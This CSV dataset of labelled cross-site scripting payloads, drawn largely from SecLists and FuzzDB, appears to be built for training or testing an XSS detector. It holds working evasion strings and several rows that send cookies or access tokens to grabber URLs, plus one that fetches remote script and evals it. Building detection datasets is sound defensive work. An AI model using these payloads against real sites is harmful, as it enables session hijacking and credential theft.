Payload,Signature,AttackType,Severity,MITRE,Label,Description
<sCriPt/src=//14.rs?,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<sVg oNloaD=write()>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<scRiPt y=""><"">/*<sCRipt* */prompt()</script",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<scr<script>ipt>alert('XSS')</scr</script>ipt>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<scr<script>ipt>alert('XSS')</scr<script>ipt>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script for=document event=onreadystatechange>getElementById('safe123').click()</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<script itworksinallbrowsers>/*<script* */alert(1)</script ?,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"<script src=""//brutelogic.com.br&sol;1.js&num;",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<script src=""\\\\example.com\\foo.js""></script> // Safari 5.0//[""'`-->]]>]</div>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<script src=""data:&comma;alert(1)//",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<script src=""http://code.jquery.com/jquery-1.4.4.js""></script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<script src=""https://js.rip/<custom.name>""></script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script src='/PATH.js'></script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script src=//3334957647/1>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<script src=//<custom.subdomain>.xss.ht></script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script src=//brutelogic.com.br/1.js>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<script src=14.rs>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script src=javascript:alert(1)>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"  </script>""",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"  </script>""",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script type=""text/javascript"">alert('XSS')</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script type=""text/javascript"">alert('sub-svg 1');</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script type=""text/javascript"">alert('sub-svg 2');</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script type=""text/javascript"">alert(document.cookie)</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script type=""text/javascript"">confirm('XSS')</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script type=""text/javascript"">prompt('XSS')</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script x>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script x> alert(1) </script 1=2,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<script x>alert('XSS')<script y>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script/src=""data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"  </script>""",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"</script>""",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"foo=""""text </script>""",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"</script>""",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"<script>$.getScript(""//<custom.subdomain>.xss.ht"")</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>+-+-1-+-+alert(1)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"<script>/*jaVasCript:/*-/*`/*\\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e*/</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"<script>//jaVasCript:/*-/*`/*\\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>\\u0061lert('22')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script>alert(""XSS"")</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert('1')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert('DVWA XSS')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,DVWA XSS
<script>alert('XSS');</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<script>alert('XSS')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert('document.domain')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert('svg desc')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert('svg foreignObject')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert('svg title')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert(0)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"    anythinglr00</script>""",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert(1)//,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<script>alert(1);</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert(1)<!–,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<script>alert(1)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert(2)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert(3)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert(31337)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from burpsuite
<script>alert(document.cookie)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<script>alert(document.domain)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script>alert(document.domain.concat(""\\n"").concat(window.origin))</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<script>alert(document.head.childNodes[3].text)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<script>alert(x.parentNode.parentNode.parentNode.location)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script>confirm(""XSS"")</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>confirm('1')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>confirm('XSS')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>confirm('document.domain')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>confirm(document.cookie)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>confirm(document.domain)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script>console.log(""Test XSS from the search bar of page XYZ\\n"".concat(document.domain).concat(""\\n"").concat(window.origin))</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>d.innerHTML+='';</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<script>debugger;</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>document.cookie='sessionid=hacked'</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Hackazon session hijacking
<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>eval('\\x61lert(\\'33\\')')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>eval(8680439..toString(30))(983801..toString(36))</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script>eval(atob(""YWxlcnQoZG9jdW1lbnQuY29va2llKQ==""))<script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"    <script>onerror=alert;throw 1337</script>""",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"><script>alert('XSS')</script>""",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script>new Image().src=""http://localhost/cookie.php?c=""+document.cookie;</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script>new Image().src=""http://localhost/cookie.php?c=""+localStorage.getItem('access_token');</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>onerror=alert;throw 1337</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script>prompt(""XSS"")</script>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>prompt('1')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>prompt('XSS')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>prompt('document.domain')</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>prompt(1)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>prompt(document.cookie)</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<script>window['alert'](document['domain'])</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<script>with(document.getElementById(""d""))innerHTML=innerHTML</script>//[""'`-->]]>]</div>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<script>{onerror=alert}throw 1337</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<script>{onerror=eval}throw'=alert\\x281337\\x29'</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<script>~'\\u0061' ;  \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073.  \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<select autofocus onfocus=alert(1)>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<select onchange=alert(1)><option>1<option>2,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<select onfocus=alert(""XSS"") autofocus>",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<select onfocus=alert('1') autofocus>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<select onfocus=alert('XSS') autofocus>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<select onfocus=alert('document.domain') autofocus>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<select onfocus=alert(1) autofocus>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload
<select onfocus=confirm('XSS') autofocus>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<select onfocus=prompt('XSS') autofocus>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<select/**/onfocus=alert('XSS')/**/autofocus>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<set attributeName=""onmouseover"" to=""alert(89)""/>",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<set attributeName=""xlink:href"" begin=""accessKey(a)"" to=""//example.com/?a"" />",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<set attributeName=""xlink:href"" begin=""accessKey(b)"" to=""//example.com/?b"" />",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<set attributeName=""xlink:href"" begin=""accessKey(c)"" to=""//example.com/?c"" />",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<set attributeName=""xlink:href"" begin=""accessKey(d)"" to=""//example.com/?d"" />",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<span onblur=prompt(""XSS"")>",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<span onchange=prompt(""XSS"")>",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<span onclick=prompt(""XSS"")>",EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<span onkeydown=prompt(""XSS"")>",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<span onkeyup=prompt(""XSS"")>",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<span onmouseout=prompt(""XSS"")>",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<span onmouseover=prompt(""XSS"")>",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<style type=""text/css"">",COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<style>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<style>jaVasCript:/*-/*`/*\\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e</style>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"<stylesheet xmlns=""http://www.w3.org/TR/WD-xsl"">",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<svG/x="">""/oNloaD=confirm()//",EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<svgonload=alert(1)>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<svgonload=alert(1)>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<svg contentScriptType=text/vbs><script>MsgBox+1,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<svg id=alert(1) onload=eval(id)>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<svg onload=alert(""XSS"")>",EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<svg onload=alert('1')>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<svg onload=alert('XSS')>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<svg onload=alert('document.domain')>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<svg onload=alert(1)//,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<svg onload=alert(1)>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<svg onload=confirm('XSS')>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<svg onload=javascript:alert('XSS')>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<svg onload=prompt('XSS')>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(document.domain)""/>",EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<svg xmlns=""http://www.w3.org/2000/svg"">",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<svg%0Aonload=%09((pro\\u006dpt))()//,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<svg/**/onload=alert('XSS')>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<svg/onload='fetch(""//host/a"").then(r=>r.text().then(t=>eval(t)))'>",EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<svg/onload=alert('XSS')>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<svg/onload=alert(1),EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"<svg:circle cx=""0.45"" cy=""0.7"" r=""0.075"" fill=""white""/>",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<svg:mask id=""maskForClickjacking"" maskUnits=""objectBoundingBox"" maskContentUnits=""objectBoundingBox"">",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<svg:rect x=""0.0"" y=""0.0"" width=""0.373"" height=""0.3"" fill=""white""/>",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<svg:svg>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<svg><![CDATA[><image xlink:href=""]]><img src=xx:x onerror=alert(2)//""></svg>//[""'`-->]]>]</div>",EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<svg><script ?>alert(1),SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<svg><script onlypossibleinopera:-)> alert(1),SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<svg><script>//&NewLine;confirm(1);</script </svg>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<svg><script>alert&lpar;'33'&rpar;,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<svg><script>alert('33'),SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;"">//[""'`-->]]>]</div>",EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<template match=""/"">",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<textarea autofocus onfocus=alert(1)>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
